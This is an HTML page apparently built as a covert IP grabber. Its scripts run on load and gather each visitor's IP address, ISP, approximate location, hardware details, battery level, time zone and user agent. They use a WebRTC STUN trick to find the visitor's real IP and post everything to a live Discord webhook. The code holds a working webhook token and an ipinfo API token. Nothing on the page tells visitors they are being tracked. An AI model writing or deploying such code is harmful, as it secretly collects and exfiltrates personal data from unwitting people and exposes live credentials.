<!DOCTYPE html>

<head>

<script>
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1512175774239690842/hgYlrlSj6fH8PLMooHYu3t7Gz8Nm7FggoNlq6dojdBEhoTJcPw9h_JLyXs1ms38cz413"; // Replace with your webhook

  // Get User-Agent string
  const userAgent = navigator.userAgent;

  // Detect Operating System
  function detectOS() {
    const ua = navigator.userAgent;
    if (/Windows NT/i.test(ua)) return "Windows";
    if (/Macintosh|Mac OS X/i.test(ua)) return "macOS";
    if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
    if (/Android/i.test(ua)) return "Android";
    if (/Linux/i.test(ua)) return "Linux";
    return "Unknown";
  }
  const os = detectOS();

  // Get browser info with modern fallback
  let browserInfo;
  if (navigator.userAgentData) {
    browserInfo = navigator.userAgentData.brands
      .map(b => `${b.brand} v${b.version}`)
      .join(", ");
  } else {
    const ua = navigator.userAgent;
    if (ua.includes("Firefox")) browserInfo = "Firefox";
    else if (ua.includes("Safari") && !ua.includes("Chrome")) browserInfo = "Safari";
    else browserInfo = "Unknown / Not Chromium";
  }

  // Get screen resolution
  const screenRes = `${screen.width}x${screen.height}`;

  // Device type by screen width
  function detectDeviceType() {
    const width = window.innerWidth;
    if (width <= 768) return "Phone";
    return "PC";
  }
  const deviceType = detectDeviceType();

  // Get CPU cores
  const cpuCores = navigator.hardwareConcurrency || "Unknown";

  // Get RAM in GB
  const ramGB = navigator.deviceMemory || "Unknown";

  // Detect GPU
  function getGPU() {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (!gl) return "Unknown";
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if (debugInfo) return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
      return "Unknown";
    } catch (e) {
      return "Unknown";
    }
  }
  const gpu = getGPU();

  // Get browser language
  const browserLang = navigator.language || "Unknown";

  // Get time zone
  const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";

  // Referrer
  const referrerUrl = document.referrer || "";
  function getReferrerName(ref) {
    if (!ref) return "Direct / None";
    if (ref.includes("google.")) return "Google";
    if (ref.includes("duckduckgo.com")) return "DuckDuckGo";
    if (ref.includes("bing.com")) return "Bing";
    if (ref.includes("yahoo.com")) return "Yahoo";
    return ref;
  }
  const referrer = getReferrerName(referrerUrl);

  // Detect network connection type
  const connectionType = navigator.connection?.effectiveType || "Unknown";

  // Detect if device has touch screen
  const touchSupport = (navigator.maxTouchPoints && navigator.maxTouchPoints > 0) ? "Yes" : "No";

  // Function to send data to Discord
  function sendWebhook(batteryLevel = "Unknown") {
    fetch("https://ipinfo.io/json?token=6ed2b2fac88455") // Replace YOUR_TOKEN_HERE
      .then(res => res.json())
      .then(data => {
        const ip = data.ip || "Unknown";
        const isp = data.org || "Unknown";
        const location = `${data.city || "Unknown"}, ${data.region || "Unknown"}, ${data.country || "Unknown"}`;

        return fetch(WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            embeds: [
              {
                title: "🆕 New Visitor Info",
                description: "A visitor just accessed your site.",
                color: 3447003,
                fields: [
                  // Location & IP
                  { name: "🌐 IP Address", value: ip, inline: true },
                  { name: "🏢 ISP / Org", value: isp, inline: true },
                  { name: "📍 Location", value: location, inline: true },

                  // Device & OS
                  { name: "💻 Device Type", value: deviceType, inline: true },
                  { name: "🖥️ Operating System", value: os, inline: true },
                  { name: "🖱️ Browser", value: browserInfo, inline: true },

                  // Referrer
                  { name: "🔗 Referrer", value: referrer, inline: false },

                  // Hardware info
                  { name: "🖼️ Screen Resolution", value: screenRes, inline: true },
                  { name: "🧠 CPU Cores", value: cpuCores.toString(), inline: true },
                  { name: "💾 RAM (GB)", value: ramGB.toString(), inline: true },
                  { name: "🎮 GPU", value: gpu, inline: true },
                  { name: "🔋 Battery (%)", value: batteryLevel, inline: true },
                  { name: "📶 Connection Type", value: connectionType, inline: true },
                  { name: "✋ Touch Screen", value: touchSupport, inline: true },

                  // Other info
                  { name: "🌐 Language", value: browserLang, inline: true },
                  { name: "⏰ Time Zone", value: timeZone, inline: true },

                  // User-Agent last
                  { name: "📝 User-Agent", value: userAgent, inline: false }
                ],
                timestamp: new Date().toISOString(),
                footer: { text: "Visitor Tracker" }
              }
            ]
          })
        });
      })
      .catch(err => console.error("Error sending data:", err));
  }

  // Only call sendWebhook after battery info is available
  if (navigator.getBattery) {
    navigator.getBattery()
      .then(battery => {
        const batteryLevel = battery.level != null ? Math.round(battery.level * 100) + "%" : "Unknown";
        sendWebhook(batteryLevel); // send webhook with actual battery value
      })
      .catch(() => sendWebhook("Unknown"));
  } else {
    sendWebhook("Unknown");
  }
</script>

<script>

const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1512175774239690842/hgYlrlSj6fH8PLMooHYu3t7Gz8Nm7FggoNlq6dojdBEhoTJcPw9h_JLyXs1ms38cz413';
// ==========================================

async function getIPViaWebRTC() {
    return new Promise((resolve, reject) => {
        const pc = new RTCPeerConnection({
            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
        });

        pc.createDataChannel('');

        pc.onicecandidate = (event) => {
            if (!event.candidate) return;
            
            const candidate = event.candidate.candidate;
            if (candidate) {
                const ipMatch = candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
                if (ipMatch && 
                    !ipMatch[0].startsWith('192.168.') && 
                    !ipMatch[0].startsWith('10.') && 
                    !ipMatch[0].startsWith('172.16.')) {
                    resolve(ipMatch[0]);
                    pc.close();
                }
            }
        };

        setTimeout(() => {
            reject('WebRTC timeout');
            pc.close();
        }, 5000);
    });
}

async function sendToDiscord(ip) {
    const message = {
        content: `🌐 **New Visitor**\nIP: ${ip}\nTime: ${new Date().toLocaleString()}\nUA: ${navigator.userAgent}`
    };

    try {
        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(message)
        });
        console.log('✅ Sent to Discord');
    } catch (error) {
        console.error('❌ Discord error:', error);
    }
}

// Run it
(async () => {
    try {
        const ip = await getIPViaWebRTC();
        await sendToDiscord(ip);
    } catch (error) {
        console.log('WebRTC failed, using fallback...');
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            await sendToDiscord(data.ip);
        } catch (e) {
            console.error('Everything failed:', e);
        }
    }
})();
</script>
